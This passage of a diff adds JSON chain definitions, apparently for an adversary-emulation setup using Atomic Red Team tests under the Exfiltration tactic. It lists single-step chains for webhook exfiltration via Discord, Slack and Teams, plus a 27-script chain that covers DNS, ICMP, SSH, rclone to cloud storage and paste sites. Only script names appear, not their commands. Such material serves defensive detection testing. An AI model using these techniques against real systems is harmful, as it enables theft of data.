+      "description": "Single-step chain for T1567.004 — Exfiltrate staged data to a Discord webhook (PowerShell)",
+      "package": "art-exfil-v1",
+      "tcode": "T1567.004",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1567.004 - Exfiltrate staged data to a Discord webhook (PowerShell)"
+      ]
+    },
+    {
+      "name": "ART - T1567.004 - Exfiltrate staged file to a Discord webhook with curl (bash)",
+      "description": "Single-step chain for T1567.004 — Exfiltrate staged file to a Discord webhook with curl (bash)",
+      "package": "art-exfil-v1",
+      "tcode": "T1567.004",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1567.004 - Exfiltrate staged file to a Discord webhook with curl (bash)"
+      ]
+    },
+    {
+      "name": "ART - T1567.004 - Exfiltrate staged data to a Slack webhook with curl (sh)",
+      "description": "Single-step chain for T1567.004 — Exfiltrate staged data to a Slack webhook with curl (sh)",
+      "package": "art-exfil-v1",
+      "tcode": "T1567.004",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1567.004 - Exfiltrate staged data to a Slack webhook with curl (sh)"
+      ]
+    },
+    {
+      "name": "ART - T1567.004 - Exfiltrate staged data to a Microsoft Teams webhook (Powe...",
+      "description": "Single-step chain for T1567.004 — Exfiltrate staged data to a Microsoft Teams webhook (Powe...",
+      "package": "art-exfil-v1",
+      "tcode": "T1567.004",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1567.004 - Exfiltrate staged data to a Microsoft Teams webhook (Powe..."
+      ]
+    },
+    {
+      "name": "ART - Exfiltration - Full Tactic Chain",
+      "description": "Runs all 27 ART scripts for Exfiltration (TA0010) in sequence.",
+      "package": "art-exfil-v1",
+      "tcode": "T1020",
+      "tactic": "Exfiltration",
+      "script_refs": [
+        "ART - T1020 - IcedID Botnet HTTP PUT",
+        "ART - T1020 - Exfiltration via Encrypted FTP",
+        "ART - T1030 - Data Transfer Size Limits",
+        "ART - T1030 - Network-Based Data Transfer in Small Chunks",
+        "ART - T1041 - C2 Data Exfiltration",
+        "ART - T1041 - Text Based Data Exfiltration using DNS subdomains",
+        "ART - T1048 - Exfiltration Over Alternative Protocol - SSH",
+        "ART - T1048 - Exfiltration Over Alternative Protocol - SSH [7c3cb337]",
+        "ART - T1048 - DNSExfiltration (doh)",
+        "ART - T1048 - Exfiltrate Data using DNS Queries via dig",
+        "ART - T1048.002 - Exfiltrate data HTTPS using curl windows",
+        "ART - T1048.002 - Exfiltrate data HTTPS using curl freebsd,linux or macos",
+        "ART - T1048.002 - Exfiltrate data in a file over HTTPS using wget",
+        "ART - T1048.002 - Exfiltrate data as text over HTTPS using wget",
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - ICMP",
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - HTTP",
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - SMTP",
+        "ART - T1048.003 - MAZE FTP Upload",
+        "ART - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone",
+        "ART - T1048.003 - Python3 http.server",
+        "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Wind...",
+        "ART - T1567.002 - Exfiltrate data with rclone to cloud Storage - AWS S3",
+        "ART - T1567.003 - Exfiltrate data with HTTP POST to text storage sites - pa...",
+        "ART - T1567.004 - Exfiltrate staged data to a Discord webhook (PowerShell)",
+        "ART - T1567.004 - Exfiltrate staged file to a Discord webhook with curl (bash)",
+        "ART - T1567.004 - Exfiltrate staged data to a Slack webhook with curl (sh)",
+        "ART - T1567.004 - Exfiltrate staged data to a Microsoft Teams webhook (Powe..."
+      ]
+    }
+  ]
+}
